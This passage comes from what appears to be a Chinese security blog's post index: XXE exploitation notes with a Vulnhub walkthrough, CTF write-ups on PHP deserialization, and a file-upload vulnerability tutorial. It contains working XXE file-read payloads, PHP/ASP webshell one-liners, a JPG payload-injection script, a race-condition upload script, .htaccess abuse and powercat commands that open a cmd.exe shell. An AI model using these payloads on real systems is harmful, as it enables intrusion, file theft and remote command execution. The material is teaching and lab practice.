$xmlfile = file_get_contents(&#x27;php://input&#x27;); if(preg_match(&#x27;/&lt;\\?xml version=&quot;1\\.0&quot;/&#x27;, $xmlfile))&#123; die(&#x27;error&#x27;); &#125; if(isset($xmlfile))&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); &#125; highlight_file(__FILE__); 376 1error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(preg_match(&#x27;/&lt;\\?xml version=&quot;1\\.0&quot;/i&#x27;, $xmlfile))&#123; die(&#x27;error&#x27;);&#125;if(isset($xmlfile))&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__); 377 1error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(preg_match(&#x27;/&lt;\\?xml version=&quot;1\\.0&quot;|http/i&#x27;, $xmlfile))&#123; die(&#x27;error&#x27;);&#125;if(isset($xmlfile))&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__); 3.5.2 修改 Content-Type类型一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击。 题目链接 1&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt; 3.5.3 引入本地 dtd 文件题目链接 1&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt;]&gt;&lt;message&gt;1234010123502402340&lt;/message&gt; 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY % ISOamso &#x27; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;send; &#x27;&gt; %remote;]&gt;&lt;message&gt;1234&lt;/message&gt; Exploiting XXE to retrieve data by repurposing a local DTD[2] 这个 payload 主要是利用 错误信息来打印目标文件的内容，重新定义了 docbookx.dtd （一般有 Gnome 就有它）里面的 ISOamso。我们提交了这个 payload 之后，当导入本地的 DTD 文件时，会优先执行我们定义的 ISOamso，因此可以达成任意文件读取。 3.5.4 VulnhubVulnhub 确定 IP 1kali:nmap -sS 192.168.158.0/24nmap -sV -p- 192.168.158.121 目录扫描 1dirb http://192.168.158.121 1User-agent: *Allow: /User-Agent: *Disallow: /xxe/*Disallow: /admin.php XXE 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;test;&lt;/name&gt;&lt;password&gt;1&lt;/password&gt;&lt;/root&gt; admin.php 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=admin.php&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;test;&lt;/name&gt;&lt;password&gt;1&lt;/password&gt;&lt;/root&gt; 1&lt;?php session_start();?&gt;&lt;html lang = &quot;en&quot;&gt; &lt;head&gt; &lt;title&gt;admin&lt;/title&gt; &lt;link href = &quot;css/bootstrap.min.css&quot; rel = &quot;stylesheet&quot;&gt; &lt;style&gt; body &#123; padding-top: 40px; padding-bottom: 40px; background-color: #ADABAB; &#125; .form-signin &#123; max-width: 330px; padding: 15px; margin: 0 auto; color: #017572; &#125; .form-signin .form-signin-heading, .form-signin .checkbox &#123; margin-bottom: 10px; &#125; .form-signin .checkbox &#123; font-weight: normal; &#125; .form-signin .form-control &#123; position: relative; height: auto; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; padding: 10px; font-size: 16px; &#125; .form-signin .form-control:focus &#123; z-index: 2; &#125; .form-signin input[type=&quot;email&quot;] &#123; margin-bottom: -1px; border-bottom-right-radius: 0; border-bottom-left-radius: 0; border-color:#017572; &#125; .form-signin input[type=&quot;password&quot;] &#123; margin-bottom: 10px; border-top-left-radius: 0; border-top-right-radius: 0; border-color:#017572; &#125; h2&#123; text-align: center; color: #017572; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h2&gt;Enter Username and Password&lt;/h2&gt; &lt;div class = &quot;container form-signin&quot;&gt; &lt;?php $msg = &#x27;&#x27;; if (isset($_POST[&#x27;login&#x27;]) &amp;&amp; !empty($_POST[&#x27;username&#x27;]) &amp;&amp; !empty($_POST[&#x27;password&#x27;])) &#123; if ($_POST[&#x27;username&#x27;] == &#x27;administhebest&#x27; &amp;&amp; md5($_POST[&#x27;password&#x27;]) == &#x27;e6e061838856bf47e1de730719fb2609&#x27;) &#123; $_SESSION[&#x27;valid&#x27;] = true; $_SESSION[&#x27;timeout&#x27;] = time(); $_SESSION[&#x27;username&#x27;] = &#x27;administhebest&#x27;; echo &quot;You have entered valid use name and password &lt;br /&gt;&quot;; $flag = &quot;Here is the &lt;a style=&#x27;color:FF0000;&#x27; href=&#x27;/flagmeout.php&#x27;&gt;Flag&lt;/a&gt;&quot;; echo $flag; &#125;else &#123; $msg = &#x27;Maybe Later&#x27;; &#125; &#125; ?&gt; &lt;/div&gt; &lt;!-- W00t/W00t --&gt; &lt;div class = &quot;container&quot;&gt; &lt;form class = &quot;form-signin&quot; role = &quot;form&quot; action = &quot;&lt;?php echo htmlspecialchars($_SERVER[&#x27;PHP_SELF&#x27;]); ?&gt;&quot; method = &quot;post&quot;&gt; &lt;h4 class = &quot;form-signin-heading&quot;&gt;&lt;?php echo $msg; ?&gt;&lt;/h4&gt; &lt;input type = &quot;text&quot; class = &quot;form-control&quot; name = &quot;username&quot; required autofocus&gt;&lt;/br&gt; &lt;input type = &quot;password&quot; class = &quot;form-control&quot; name = &quot;password&quot; required&gt; &lt;button class = &quot;btn btn-lg btn-primary btn-block&quot; type = &quot;submit&quot; name = &quot;login&quot;&gt;Login&lt;/button&gt; &lt;/form&gt; Click here to clean &lt;a href = &quot;adminlog.php&quot; tite = &quot;Logout&quot;&gt;Session. &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 3.6 修复建议（1）禁止使用外部实体，例如 libxml_disable_entity_loader(true) （2）过滤用户提交的XML数据，防止出现非法内容，如关键词：&lt;!DOCTYPE和&lt;!ENTITY或者SYSTEM和PUBLIC等 （3）检查所使用的底层XML解析库，默认禁止外部实体的解析 （4）若使用第三方应用代码需要及时升级补丁 1PHP：libxml_disable_entity_loader(true);JAVA:DocumentBuilderFactorydbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Python：from lxml import etreexmlData= etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) nmap 3.7 参考XXE : https://xz.aliyun.com/t/3357#toc-17 XXE : https://mature-sec.com/post/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ PHP-dom : https://www.runoob.com/php/php-xml-parser-expat.html 菜鸟教程~XML： https://www.runoob.com/xml/xml-tutorial.html 菜鸟教程~DTD： https://www.runoob.com/dtd/dtd-tutorial.html https://www.cnblogs.com/20175211lyz/p/11413335.html XML Schema 菜鸟教程 使用 XML Schema 攻击 XSLT 攻击 (xxe) https://www.cnblogs.com/AtesetEnginner/p/11261653.html Windows上的powercat正向连接Kali上的nc 1kali:192.168.158.111 nc -lvvp 4444 win-10:192.168.158.110 powercat -c 192.168.158.111 -p 4444 -e cmd.exe kali上的nc反向链接到windows上的powercat 1kali:192.168.158.111 nc -vv 192.168.158.110 4444 win-10:192.168.158.110 powercat -l -p 4444 -e cmd.exe","categories":[{"name":"Web漏洞","slug":"Web漏洞","permalink":"https://xizhi-future.github.io/categories/Web%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://xizhi-future.github.io/tags/Web/"},{"name":"漏洞","slug":"漏洞","permalink":"https://xizhi-future.github.io/tags/%E6%BC%8F%E6%B4%9E/"}],"author":"xizhi-future"},{"title":"NUCTF","slug":"NUCTF","date":"2021-06-24T11:24:20.000Z","updated":"2021-07-12T04:40:08.086Z","comments":true,"path":"2021/06/24/NUCTF/","link":"","permalink":"https://xizhi-future.github.io/2021/06/24/NUCTF/","excerpt":"概述：主要考点 — 序列化与反序列化字符逃逸","text":"概述：主要考点 — 序列化与反序列化字符逃逸 NUCTF1 EasyUnser12345678910111213141516171819&lt;?php include_once &#x27;flag.php&#x27;;highlight_file(__FILE__);// Security filtering function function filter($str)&#123; return str_replace(&#x27;secure&#x27;, &#x27;secured&#x27;, $str); &#125; class Hacker&#123; public $username = &#x27;margin&#x27;; public $password = &#x27;margin123&#x27;; &#125; $h = new Hacker(); if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123; // Security filtering $h-&gt;username = $_POST[&#x27;username&#x27;]; $c = unserialize(filter(serialize($h))); if ($c-&gt;password === &#x27;hacker&#x27;)&#123; echo $flag; &#125; &#125; 分析： POST 传入参数 username 和 password 题目初始化 public $password = &#39;margin123&#39;; ，而要想获取 flag 必须使 password 为 hacker 根据 PHP 反序列化时遇到 ;&#125; 即反序列化结束，我们传入 username 为 margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125; ，希望原本初始化的 password 的值 margin123 失效（被顶出去） 123456789 &lt;?php class Hacker&#123; public $username = &#x27;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;; public $password = &#x27;margin123&#x27;; &#125; $h = new Hacker(); echo serialize($h);# 得到 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:37:&quot;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125; 1234567&lt;?php class Hacker&#123; public $username = &#x27;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;; public $password = &#x27;margin123&#x27;; &#125; $h = new Hacker(); print_r(unserialize($h); 如果我们将上面的得到的内容进行 反序列化输出，结果将会报错；这是因为 s:37:&quot;margin&quot;; 这里按道理应该是 s:6:&quot;margin&quot;;，但由于我们需要按照上面的方法将后面的 &quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125; 挤掉，因此实际上传入的长度是37，所以我们需要想办法将这37个长度补齐，还需要多传入 31个长度； 题目中的 filter 函数即是将 secuer 替换为 secured ，一个 secured 比 secure 多一个长度，那么 31个 secure 就会多出 31个长度，从而导致字符增加 123456789101112131415 &lt;?php class Hacker&#123; public $username = &#x27;securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;; public $password = &#x27;margin123&#x27;; &#125; $h = new Hacker(); echo serialize($h);# 输出 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:217:&quot;securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;实际上username的长度是186，但是被替换之后成为 # 被 filter 替换之后变成 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:217:&quot;securedsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecured&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;# 这样就补齐了 payload： 1post传参： username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure%22;s:8:%22password%22;s:6:%22hacker%22;&#125;&amp;password=123 2 Just Serizlize123456789101112131415161718192021222324&lt;?phphighlight_file(__FILE__);include &#x27;flag.php&#x27;;// $flag = &quot;DASCTF&#123;xxxxx&#125;&quot;$obj = $_GET[&#x27;obj&#x27;];if (preg_match(&#x27;/flag/i&#x27;, $obj))&#123; die(&quot;?&quot;);&#125;$obj = @unserialize($obj);if ($obj-&gt;flag === &#x27;flag&#x27;)&#123; $obj-&gt;flag = $flag;&#125;foreach ($obj as $k =&gt; $v)&#123; if ($k !== &quot;flag&quot;) &#123; echo $v; &#125;&#125;?&gt; 分析： GET 传参 obj； 传入参数不得含有 flag；对象中包含 flag 字段时，才会传入 $flag 的内容；但当字段名不为 flag 时，才能显示出 $flag； hex 编码绕过 if ($k !== &quot;flag&quot;) ，把 s 换成 S； 表示字符类型的s大写时, 会被当成16进制解析, 定义一个变量取 flag 变量的地址即可得到 flag 变量的值； 123456 &lt;?php $obj = (object)[&#x27;flag&#x27;=&gt;&#x27;flag&#x27;]; $obj-&gt;Hh0 = &amp;$obj-&gt;flag; echo serialize($obj);# 得到 O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;s:3:&quot;Hh0&quot;;R:2;&#125; payload： 1234?obj=O:8:&quot;stdClass&quot;:2:&#123;S:4:&quot;\\66\\6c\\61\\67&quot;;S:4:&quot;\\66\\6c\\61\\67&quot;;s:3:&quot;Hh0&quot;;R:2;&#125;?obj=O:8:&quot;stdClass&quot;:2:&#123;S:4:&quot;\\66\\6c\\61\\67&quot;;S:4:&quot;\\66\\6c\\61\\67&quot;;s:3:&quot;asd&quot;;R:2;&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"文件上传漏洞","slug":"文件上传漏洞","date":"2021-06-06T14:42:17.000Z","updated":"2021-07-09T07:10:18.117Z","comments":true,"path":"2021/06/06/文件上传漏洞/","link":"","permalink":"https://xizhi-future.github.io/2021/06/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"一、文件上传漏洞 1234成因：服务器配置不当导致任意文件上传Web应用对上传的文件没有进行足够的限制程序开发部署时，由于未考虑系统特性或验证而导致限制被绕过","text":"一、文件上传漏洞 1234成因：服务器配置不当导致任意文件上传Web应用对上传的文件没有进行足够的限制程序开发部署时，由于未考虑系统特性或验证而导致限制被绕过 1.1 条件1231.Web服务器开启了文件上传功能，且上传api（接口）对外开放（Web用户可以访问）2.Web用户对目标目录具有可写权限，甚至具有执行权限3.上传的文件可执行，即Web容器可以解析我们上传的脚本 1.2 WebShell 计算机科学中，Shell俗称为“壳”，指的是“为使用者提供操作界面”的软件，即命令解释器。相当与Windows系统的cmd.exe，Linux系统中的bash。Webshell本质上是在服务器端可运行的脚本文件，以Web方式（HTTP协议）去通信（传递命令消息）。它是一个网站的后门，后缀名为.php/,asp/.aspx/.jsp等。即Webshell接受来自Web用户的命令，在服务器端执行。 1.3 小马小马 原理： 1234567示例： &lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;解释：1.&lt;?php ?&gt;--php代码的标识，使服务器按照 php代码去解析2.@--当执行错误的时候，不会报错3.eval()--把字符串作为 php代码去执行4.$_POST--以POST方式获取 cmd参数 12345678asp:&lt;%eval request(&quot;cmd&quot;)%&gt;aspx: &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;cmd&quot;],&quot;unsafe&quot;);%&gt;php:&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;]); ?&gt;&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&quot;&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;])?&gt;&quot;); ?&gt; 变形一句话 工具：中国菜刀文件管理：查看，上传，下载，修改，删除，运行exe程序虚拟终端：cmd窗口数据库管理：需要填写相关配置 12345&lt;T&gt;MYSQL&lt;T&gt;&lt;H&gt;localhost&lt;H&gt;&lt;U&gt;root&lt;U&gt;&lt;P&gt;密码&lt;P&gt; 为空可不写&lt;L&gt;utf8&lt;L&gt; 1.4 黑白名单策略URLBlacklist–黑名单一律 禁止 URLWhitelist–白名单一律 允许 二、防御2.1 前端限制与绕过例如：检测文件后缀名等 12方法一：直接修改 JS 代码，或者直接删除表单事件方法二：先使恶意文件后缀名符合白名单策略，然后 Burp 抓包修改文件后缀名 2.2 服务器端检测１.MIME 类型 MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。简单说，就是 不同的文件类型 对应于 不同的应用程序。 12345.docx application/vnd.openxmlformats-officedocument.wordprocessingml.document.pdf application/pdf.ppt application/vnd.ms-powerpoint.pptx application/vnd.openxmlformats-officedocument.presentationml.presentation.pdf application/pdf 12345.gif image/gif.htm .html text/html.jpeg .jpg image/jpeg.js text/javascript.png image/png 1234.svg image/svg+xml.xml application/xml.rar application/x-rar-compressed.zip application/zip HTTP协议中，使用 Content-Type 字段 表示 MIME类型 2.文件内容123getimagesize() 函数:会测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回 图像的尺寸 以及 文件类型 及图片 高度 与 宽度成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息 1exif_imagetype() 函数 该函数相当于检验了上传文件的内容，检测其是否真的是一张图片。此时就不能直接上传 php内容 的文件了。 方法一：制作图片木马1234GIF89a&lt;?phpphpinfo();?&gt; 1234图片合并：命令：copy 1.jpg/b+phpinfo.php/a hack.jpg以二进制的方式打开，写入文件 1写入到 版权 当中 方法二：文件幻术–十六进制编辑器为了更方便的区别不同文件的类型，相同类型的文件最开头有着相同的字节。| 后缀名 | 文件头 || —— | ———————————————– || .gif | 47 49 46 38 39 61 F1 00 2C 01 F7 00 00 64 32 33 || .jpg | FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 01 2C || .png | 89 50 4E 47 0D 0A 1A 0A 00 00 00 00 49 48 44 52 | Hex-&gt;Ascii 方法三：属性版本 直接加一句话方法四：010Editor 直接加一句话相当于方法三 3.后缀名–黑白名单策略黑名单：寻找其它可允许上传的类型去绕过限制 123.php .php2 .php3 .php5 .phtml.asp .aspx .ascx .ashx .asa .cer.jsp .jspx 4.二次渲染参考1 参考2 就是将用户上传的图片重新生成 12345678910111213basename() 函数返回路径中的文件名部分&lt;?php$path = &quot;/testweb/home.php&quot;;//显示带有文件扩展名的文件名echo basename($path);//显示不带有文件扩展名的文件名echo basename($path,&quot;.php&quot;);?&gt; 输出：home.phphome 123imagecreatefromjpeg(filename)：由原文件路径生成一个信心的图像filename JPEG 图像的路径。 123bool imagejpeg ( resource image [, string filename [, int quality]] ) imagejpeg() 从 image 图像以 filename 为文件名创建一个 JPEG 图像。image 参数是 imagecreatefromjpeg 等函数的返回值。 12unlink(filename,context) :函数删除文件若成功，则返回 true，失败则返回 false 方法一：gif 绕过使用 010将gif图片的最后加上一句话，上传之后，将上传之后的图片下载下来，再次打开010查看，发现原本我们写入的一句话已经消失了。 但与之前的图片进行对照，仍有未经渲染（改变）的部分，我们可以讲一句话写入不会被渲染的部分进行上传即可。 图片末尾加一句话 经过渲染，一句话消失 找到未经渲染的部分，加一句话，上传 未被渲染掉 方法二：png绕过png图片由三个以上的数据块组成 两种类型的数据块： 1)关键数据块 2)辅助数据块：PLTE 方法一：写入IDAT数据块 1)直接在本地运行脚本，生成1.png图片 12345678910111213141516171819&lt;?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); &#125;imagepng($img,&#x27;./1.png&#x27;); ?&gt; 方法二：写入PLTE数据块 方法三：jpg绕过123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169&lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;. If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;; if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123; die(&#x27;php-gd is not installed&#x27;); &#125; if(!isset($argv[1])) &#123; die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;); &#125; set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die(&#x27;Incorrect SOI marker&#x27;); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123; die(&#x27;Success!&#x27;); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink(&#x27;payload_&#x27;.$argv[1]); die(&#x27;Something\\&#x27;s wrong&#x27;); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&#x27;/(\\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = &#x27;&#x27;; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die(&#x27;End Of File&#x27;); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die(&#x27;End Of File&#x27;); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125;?&gt; 先找一张jpg上传，将上传的图片进行下载，kali运行脚本 php ben.php 21044.jpg 010打开查看 写入成功 5.条件竞争示例 123456789101112if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &#x27;上传出错！&#x27;; &#125; 之前都是，首先判断 我们上传的文件 是否 符合白名单，或者是不在黑名单当中；只有当条件符合时，才会使用 move_uploaded_file($temp_file, $upload_file) 将我们上传的文件进行路径移动。 而本题时首先将我们上传的文件进行路径移动，然后再判断是否符合白名单，如果不符合的话，就会使用 unlink($upload_file); 将我们上传的文件进行 删除 。 因此如果我们想要上传 .php 文件的话，就需要 在 其服务器删除我们的文件之前进行访问利用。 方法：短时间内不断重复上传该文件，可使用 BurpSuite 方法一：Burp Suite 爆破上传一个key.php 1&lt;?php fputs(fopen(&quot;info.php&quot;, &quot;w&quot;), &#x27;&lt;?php phpinfo();?&gt;&#x27;); ?&gt; //此代码的作用是只要 一访问到key.php，此脚本就被解析 进而生成info.php文件，内容为 &lt;?php phpinfo();?&gt; 进行无限次的 上传 key.php 和无限次的访问 key.php 直到访问的状态码为200即上传 info.php成功 方法二：访问部分可使用 python脚本1234567import requests url = &quot;http://127.0.0.1:8090/upload/key.php&quot; while True: html = requests.get(url) if html.status_code == 200: print(&quot;OK&quot;) break else:print(&quot;NO&quot;) 三、.htaccess 攻击 httpd-conf 是APache 系统的配置文件（全局的）； .htaccess 文件是 Apache 服务器的分布式配置文件（局部的），该配置文件会覆盖Apache服务器的全局配置，只对 该文件所在目录下的文件起作用。如果一个Web应用程序允许上传.htaccess文件，则说明攻击者可以更改Apache的配置。 缺点：只在 Apache 服务器 下起作用 使用条件： Apache目录下：/conf/httpd.conf 中 AllowOverride 为 All 则意味着.htaccess 文件可更改 Apache 配置 3.1 利用一：将.png 文件当作 PHP文件处理123将所有.png格式的图片都当作.php处理：phpinfo.png在 .htaccess 文件中写入：AddType application/x-httpd-php .png 3.2 利用二：文件中包含 php 关键字123文件名中只要包含 .php 关键字就当作php处理：phpinfo.php.png在 .htaccess 文件中写入：AddHandler php5-script php 3.3 利用三：匹配文件名1234匹配文件名：文件名&lt;FilesMatch &quot;文件名&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 3.4 利用四：将所有文件后缀都当作php文件处理1234.htaccess 文件当中写入： SetHandler application/x-httpd-php phpinfo1.gif 写入：&lt;?php phpinfo(); ?&gt; 四、.user.ini php.ini 是 PHP 的一个 全局配置文件（全局的）； .user.ini 是 PHP的目录配置文件（局部的），相当于用户自己定义的一个 php.ini 文件。 PHP中的每个配置都有其所处的模式。其中允许使用 .user.ini 能够更改的模式有 PHP_INI_PERDIR 和 PHP_INI_USER 等等。 而 